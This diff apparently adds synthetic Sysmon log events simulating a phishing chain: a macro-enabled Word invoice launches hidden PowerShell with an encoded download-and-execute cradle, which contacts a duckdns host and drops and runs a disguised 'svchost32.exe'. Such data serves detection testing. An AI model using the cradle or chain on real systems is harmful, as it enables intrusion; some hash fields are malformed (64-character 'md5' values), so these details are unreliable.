@@ -1,0 +1,528 @@
+[
+  {
+    "@timestamp": "@timestamp",
+    "ecs": {
+      "version": "8.11.0"
+    },
+    "event": {
+      "kind": "event",
+      "category": [
+        "process"
+      ],
+      "type": [
+        "start"
+      ],
+      "provider": "Microsoft-Windows-Sysmon",
+      "code": "1",
+      "dataset": "sysmon.process_creation",
+      "module": "sysmon"
+    },
+    "host": {
+      "name": "DESKTOP-HR-01",
+      "hostname": "DESKTOP-HR-01",
+      "domain": "corp.local",
+      "ip": [
+        "10.0.143.145"
+      ],
+      "os": {
+        "type": "windows",
+        "platform": "windows",
+        "family": "windows",
+        "name": "Windows 10 Enterprise",
+        "version": "10.0.19045"
+      }
+    },
+    "user": {
+      "name": "j.doe",
+      "domain": "CORP",
+      "id": "S-1-5-21-8698900141-2677"
+    },
+    "agent": {
+      "id": "db3871d4-1563-4b08-8866-5452f07dc541",
+      "name": "DESKTOP-HR-01",
+      "type": "winlogbeat",
+      "version": "14.0.0",
+      "ephemeral_id": "3928d7f3-362f-4ec1-bf0f-f9285834142e"
+    },
+    "process": {
+      "pid": 46691,
+      "entity_id": "{216E17A4-9C50-4656-AE66-D8250066ECBB}",
+      "name": "WINWORD.EXE",
+      "executable": "C:\\\\Program Files\\\\Microsoft Office\\\\root\\\\Office16\\\\WINWORD.EXE",
+      "command_line": "\"C:\\\\Program Files\\\\Microsoft Office\\\\root\\\\Office16\\\\WINWORD.EXE\" /n \"C:\\\\Users\\\\j.doe\\\\Downloads\\\\Invoice_Q2_2026.docm\"",
+      "working_directory": "C:\\Windows\\system32",
+      "hash": {
+        "sha256": "50efa944eea11d703ebbfb64ba1d4e8280391b5100b321223fb49da85f6780f8",
+        "md5": "6d248c4a4006142ee3c64553aefebf4458b064d965e67d20449d036052412d4f"
+      },
+      "pe": {
+        "original_file_name": "WINWORD.EXE"
+      },
+      "parent": {
+        "pid": 3124,
+        "name": "explorer.exe",
+        "entity_id": "",
+        "executable": "C:\\\\Windows\\\\explorer.exe"
+      }
+    },
+    "winlog": {
+      "provider_name": "Microsoft-Windows-Sysmon",
+      "event_id": 1,
+      "channel": "Microsoft-Windows-Sysmon/Operational",
+      "computer_name": "DESKTOP-HR-01.corp.local",
+      "record_id": 6598,
+      "opcode": "Info",
+      "task": "Process Create (rule: ProcessCreate)",
+      "event_data": {
+        "RuleName": "-",
+        "UtcTime": "@timestamp",
+        "ProcessGuid": "{216E17A4-9C50-4656-AE66-D8250066ECBB}",
+        "ProcessId": "46691",
+        "Image": "C:\\\\Program Files\\\\Microsoft Office\\\\root\\\\Office16\\\\WINWORD.EXE",
+        "FileVersion": "-",
+        "Description": "-",
+        "Product": "-",
+        "Company": "Microsoft Corporation",
+        "OriginalFileName": "WINWORD.EXE",
+        "CommandLine": "\"C:\\\\Program Files\\\\Microsoft Office\\\\root\\\\Office16\\\\WINWORD.EXE\" /n \"C:\\\\Users\\\\j.doe\\\\Downloads\\\\Invoice_Q2_2026.docm\"",
+        "CurrentDirectory": "C:\\Windows\\system32\\",
+        "User": "CORP\\j.doe",
+        "LogonGuid": "3928d7f3-362f-4ec1-bf0f-f9285834142e",
+        "LogonId": "0x607395",
+        "TerminalSessionId": "1",
+        "IntegrityLevel": "Medium",
+        "Hashes": "SHA256=50efa944eea11d703ebbfb64ba1d4e8280391b5100b321223fb49da85f6780f8,MD5=6d248c4a4006142ee3c64553aefebf4458b064d965e67d20449d036052412d4f",
+        "ParentProcessGuid": "",
+        "ParentProcessId": "3124",
+        "ParentImage": "C:\\\\Windows\\\\explorer.exe",
+        "ParentCommandLine": "-"
+      }
+    },
+    "log": {
+      "level": "information"
+    },
+    "tags": [
+      "attackchain",
+      "attack-simulation"
+    ],
+    "labels": {
+      "simulation": "attackchain",
+      "is_noise": false
+    }
+  },
+  {
+    "@timestamp": "@timestamp",
+    "ecs": {
+      "version": "8.11.0"
+    },
+    "event": {
+      "kind": "event",
+      "category": [
+        "process"
+      ],
+      "type": [
+        "start"
+      ],
+      "provider": "Microsoft-Windows-Sysmon",
+      "code": "1",
+      "dataset": "sysmon.process_creation",
+      "module": "sysmon"
+    },
+    "host": {
+      "name": "DESKTOP-HR-01",
+      "hostname": "DESKTOP-HR-01",
+      "domain": "corp.local",
+      "ip": [
+        "10.0.143.145"
+      ],
+      "os": {
+        "type": "windows",
+        "platform": "windows",
+        "family": "windows",
+        "name": "Windows 10 Enterprise",
+        "version": "10.0.19045"
+      }
+    },
+    "user": {
+      "name": "j.doe",
+      "domain": "CORP",
+      "id": "S-1-5-21-9449023744-6555"
+    },
+    "agent": {
+      "id": "db3871d4-1563-4b08-8866-5452f07dc541",
+      "name": "DESKTOP-HR-01",
+      "type": "winlogbeat",
+      "version": "14.0.0",
+      "ephemeral_id": "77657cba-641f-4d3e-b1cb-0aee3a6dcfae"
+    },
+    "process": {
+      "pid": 10778,
+      "entity_id": "{76B99F76-E9FB-4DB6-A04B-88BBD3D48320}",
+      "name": "powershell.exe",
+      "executable": "C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe",
+      "command_line": "powershell.exe -nop -w hidden -enc JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAE0AZQBtAG8AcgB5AFMAdAByAGUAYQBtACgALABbAEMAbwBuAHYAZQByAHQAXQA6ADoARgByAG8AbQBCAGEAcwBlADYANABTAHQAcgBpAG4AZwAoACIASQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAcwA6AC8ALwAiACkAKQA=",
+      "working_directory": "C:\\Windows\\system32",
+      "hash": {
+        "sha256": "8c9659c574e8c013c3e69817aad5764a3415b231faf441f723a9435d821d7fa2",
+        "md5": ""
+      },
+      "pe": {
+        "original_file_name": "powershell.exe"
+      },
+      "parent": {
+        "pid": 46691,
+        "name": "WINWORD.EXE",
+        "entity_id": "",
+        "executable": "C:\\\\Program Files\\\\Microsoft Office\\\\root\\\\Office16\\\\WINWORD.EXE"
+      }
+    },
+    "winlog": {
+      "provider_name": "Microsoft-Windows-Sysmon",
+      "event_id": 1,
+      "channel": "Microsoft-Windows-Sysmon/Operational",
+      "computer_name": "DESKTOP-HR-01.corp.local",
+      "record_id": 3628,
+      "opcode": "Info",
+      "task": "Process Create (rule: ProcessCreate)",
+      "event_data": {
+        "RuleName": "-",
+        "UtcTime": "@timestamp",
+        "ProcessGuid": "{76B99F76-E9FB-4DB6-A04B-88BBD3D48320}",
+        "ProcessId": "10778",
+        "Image": "C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe",
+        "FileVersion": "-",
+        "Description": "-",
+        "Product": "-",
+        "Company": "Microsoft Corporation",
+        "OriginalFileName": "powershell.exe",
+        "CommandLine": "powershell.exe -nop -w hidden -enc JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAE0AZQBtAG8AcgB5AFMAdAByAGUAYQBtACgALABbAEMAbwBuAHYAZQByAHQAXQA6ADoARgByAG8AbQBCAGEAcwBlADYANABTAHQAcgBpAG4AZwAoACIASQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAcwA6AC8ALwAiACkAKQA=",
+        "CurrentDirectory": "C:\\Windows\\system32\\",
+        "User": "CORP\\j.doe",
+        "LogonGuid": "77657cba-641f-4d3e-b1cb-0aee3a6dcfae",
+        "LogonId": "0x904225",
+        "TerminalSessionId": "1",
+        "IntegrityLevel": "High",
+        "Hashes": "SHA256=8c9659c574e8c013c3e69817aad5764a3415b231faf441f723a9435d821d7fa2,MD5=",
+        "ParentProcessGuid": "",
+        "ParentProcessId": "46691",
+        "ParentImage": "C:\\\\Program Files\\\\Microsoft Office\\\\root\\\\Office16\\\\WINWORD.EXE",
+        "ParentCommandLine": "-"
+      }
+    },
+    "log": {
+      "level": "information"
+    },
+    "tags": [
+      "attackchain",
+      "attack-simulation"
+    ],
+    "labels": {
+      "simulation": "attackchain",
+      "is_noise": false
+    }
+  },
+  {
+    "@timestamp": "@timestamp",
+    "ecs": {
+      "version": "8.11.0"
+    },
+    "event": {
+      "kind": "event",
+      "category": [
+        "network"
+      ],
+      "type": [
+        "connection",
+        "start"
+      ],
+      "provider": "Microsoft-Windows-Sysmon",
+      "code": "3",
+      "dataset": "sysmon.network_connection",
+      "module": "sysmon"
+    },
+    "host": {
+      "name": "DESKTOP-HR-01",
+      "hostname": "DESKTOP-HR-01",
+      "domain": "corp.local",
+      "ip": [
+        "10.0.143.145"
+      ],
+      "os": {
+        "type": "windows",
+        "platform": "windows",
+        "family": "windows",
+        "name": "Windows 10 Enterprise",
+        "version": "10.0.19045"
+      }
+    },
+    "user": {
+      "name": "j.doe",
+      "domain": "CORP"
+    },
+    "agent": {
+      "id": "db3871d4-1563-4b08-8866-5452f07dc541",
+      "name": "DESKTOP-HR-01",
+      "type": "winlogbeat",
+      "version": "14.0.0"
+    },
+    "process": {
+      "pid": 10778,
+      "name": "powershell.exe",
+      "executable": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+      "entity_id": ""
+    },
+    "source": {
+      "ip": "10.0.143.145",
+      "port": 62568,
+      "domain": "DESKTOP-HR-01.corp.local"
+    },
+    "destination": {
+      "ip": "67.70.29.160",
+      "port": 443,
+      "domain": "update-service.duckdns.org"
+    },
+    "network": {
+      "protocol": "tcp",
+      "transport": "tcp",
+      "direction": "egress",
+      "type": "ipv4",
+      "community_id": "ce79dbd9-12f2-4b47-8ed7-15e906f13cce"
+    },
+    "winlog": {
+      "provider_name": "Microsoft-Windows-Sysmon",
+      "event_id": 3,
+      "channel": "Microsoft-Windows-Sysmon/Operational",
+      "computer_name": "DESKTOP-HR-01.corp.local",
+      "record_id": 9222,
+      "event_data": {
+        "RuleName": "-",
+        "UtcTime": "@timestamp",
+        "ProcessGuid": "",
+        "ProcessId": "10778",
+        "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+        "User": "CORP\\j.doe",
+        "Protocol": "tcp",
+        "Initiated": "true",
+        "SourceIsIpv6": "false",
+        "SourceIp": "10.0.143.145",
+        "SourceHostname": "DESKTOP-HR-01.corp.local",
+        "SourcePort": "62568",
+        "SourcePortName": "-",
+        "DestinationIsIpv6": "false",
+        "DestinationIp": "67.70.29.160",
+        "DestinationHostname": "update-service.duckdns.org",
+        "DestinationPort": "443",
+        "DestinationPortName": "https"
+      }
+    },
+    "log": {
+      "level": "information"
+    },
+    "tags": [
+      "attackchain",
+      "attack-simulation"
+    ],
+    "labels": {
+      "simulation": "attackchain",
+      "is_noise": false
+    }
+  },
+  {
+    "@timestamp": "@timestamp",
+    "ecs": {
+      "version": "8.11.0"
+    },
+    "event": {
+      "kind": "event",
+      "category": [
+        "file"
+      ],
+      "type": [
+        "creation"
+      ],
+      "provider": "Microsoft-Windows-Sysmon",
+      "code": "11",
+      "dataset": "sysmon.file_creation",
+      "module": "sysmon"
+    },
+    "host": {
+      "name": "DESKTOP-HR-01",
+      "hostname": "DESKTOP-HR-01",
+      "domain": "corp.local",
+      "ip": [
+        "10.0.143.145"
+      ],
+      "os": {
+        "type": "windows",
+        "platform": "windows",
+        "family": "windows",
+        "name": "Windows 10 Enterprise",
+        "version": "10.0.19045"
+      }
+    },
+    "user": {
+      "name": "j.doe",
+      "domain": "CORP"
+    },
+    "agent": {
+      "id": "db3871d4-1563-4b08-8866-5452f07dc541",
+      "name": "DESKTOP-HR-01",
+      "type": "winlogbeat",
+      "version": "14.0.0"
+    },
+    "process": {
+      "pid": 10778,
+      "name": "powershell.exe",
+      "executable": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+      "entity_id": ""
+    },
+    "file": {
+      "path": "C:\\\\Users\\\\j.doe\\\\AppData\\\\Local\\\\Temp\\\\svchost32.exe",
+      "name": "svchost32.exe",
+      "directory": "C:\\\\Users\\\\j.doe\\\\AppData\\\\Local\\\\Temp",
+      "extension": "exe",
+      "hash": {
+        "sha256": "052a8c969d8917a7c271776c387f638ec060890de7156544fe78713b53e4a71d"
+      },
+      "created": "@timestamp"
+    },
+    "winlog": {
+      "provider_name": "Microsoft-Windows-Sysmon",
+      "event_id": 11,
+      "channel": "Microsoft-Windows-Sysmon/Operational",
+      "computer_name": "DESKTOP-HR-01.corp.local",
+      "record_id": 2896,
+      "event_data": {
+        "RuleName": "-",
+        "UtcTime": "@timestamp",
+        "ProcessGuid": "",
+        "ProcessId": "10778",
+        "Image": "C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe",
+        "TargetFilename": "C:\\\\Users\\\\j.doe\\\\AppData\\\\Local\\\\Temp\\\\svchost32.exe",
+        "CreationUtcTime": "@timestamp"
+      }
+    },
+    "log": {
+      "level": "information"
+    },
+    "tags": [
+      "attackchain",
+      "attack-simulation"
+    ],
+    "labels": {
+      "simulation": "attackchain",
+      "is_noise": false
+    }
+  },
+  {
+    "@timestamp": "@timestamp",
+    "ecs": {
+      "version": "8.11.0"
+    },
+    "event": {
+      "kind": "event",
+      "category": [
+        "process"
+      ],
+      "type": [
+        "start"
+      ],
+      "provider": "Microsoft-Windows-Sysmon",
+      "code": "1",
+      "dataset": "sysmon.process_creation",
+      "module": "sysmon"
+    },
+    "host": {
+      "name": "DESKTOP-HR-01",
+      "hostname": "DESKTOP-HR-01",
+      "domain": "corp.local",
+      "ip": [
+        "10.0.143.145"
+      ],
+      "os": {
+        "type": "windows",
+        "platform": "windows",
+        "family": "windows",
+        "name": "Windows 10 Enterprise",
+        "version": "10.0.19045"
+      }
+    },
+    "user": {
+      "name": "j.doe",
+      "domain": "CORP",
+      "id": "S-1-5-21-4532854945-5927"
+    },
+    "agent": {
+      "id": "db3871d4-1563-4b08-8866-5452f07dc541",
+      "name": "DESKTOP-HR-01",
+      "type": "winlogbeat",
+      "version": "14.0.0",
+      "ephemeral_id": "e3e0bdd6-f274-43d8-ad16-30956f2f4f19"
+    },
+    "process": {
+      "pid": 43820,
+      "entity_id": "{E4536ACC-EDE8-499F-B9B6-D2544BEF3F33}",
+      "name": "svchost32.exe",
+      "executable": "C:\\\\Users\\\\j.doe\\\\AppData\\\\Local\\\\Temp\\\\svchost32.exe",
+      "command_line": "\"C:\\\\Users\\\\j.doe\\\\AppData\\\\Local\\\\Temp\\\\svchost32.exe\" -s",
+      "working_directory": "C:\\Windows\\system32",
+      "hash": {
+        "sha256": "",
+        "md5": ""
+      },
+      "pe": {
+        "original_file_name": "svchost32.exe"
+      },
+      "parent": {
+        "pid": 10778,
+        "name": "powershell.exe",
+        "entity_id": "",
+        "executable": "C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe"
+      }
+    },
+    "winlog": {
+      "provider_name": "Microsoft-Windows-Sysmon",
+      "event_id": 1,
+      "channel": "Microsoft-Windows-Sysmon/Operational",
+      "computer_name": "DESKTOP-HR-01.corp.local",
+      "record_id": 8656,
+      "opcode": "Info",
+      "task": "Process Create (rule: ProcessCreate)",
+      "event_data": {
+        "RuleName": "-",
+        "UtcTime": "@timestamp",
+        "ProcessGuid": "{E4536ACC-EDE8-499F-B9B6-D2544BEF3F33}",
+        "ProcessId": "43820",
+        "Image": "C:\\\\Users\\\\j.doe\\\\AppData\\\\Local\\\\Temp\\\\svchost32.exe",
+        "FileVersion": "-",
+        "Description": "-",
+        "Product": "-",
+        "Company": "Microsoft Corporation",
+        "OriginalFileName": "svchost32.exe",
+        "CommandLine": "\"C:\\\\Users\\\\j.doe\\\\AppData\\\\Local\\\\Temp\\\\svchost32.exe\" -s",
+        "CurrentDirectory": "C:\\Windows\\system32\\",
+        "User": "CORP\\j.doe",
+        "LogonGuid": "e3e0bdd6-f274-43d8-ad16-30956f2f4f19",
+        "LogonId": "0x341673",
+        "TerminalSessionId": "1",
+        "IntegrityLevel": "High",
+        "Hashes": "SHA256=,MD5=",
+        "ParentProcessGuid": "",
+        "ParentProcessId": "10778",
+        "ParentImage": "C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe",
+        "ParentCommandLine": "-"
+      }
+    },
+    "log": {
+      "level": "information"
+    },
+    "tags": [
+      "attackchain",
+      "attack-simulation"
+    ],
+    "labels": {
+      "simulation": "attackchain",
+      "is_noise": false
+    }
+  }
+]
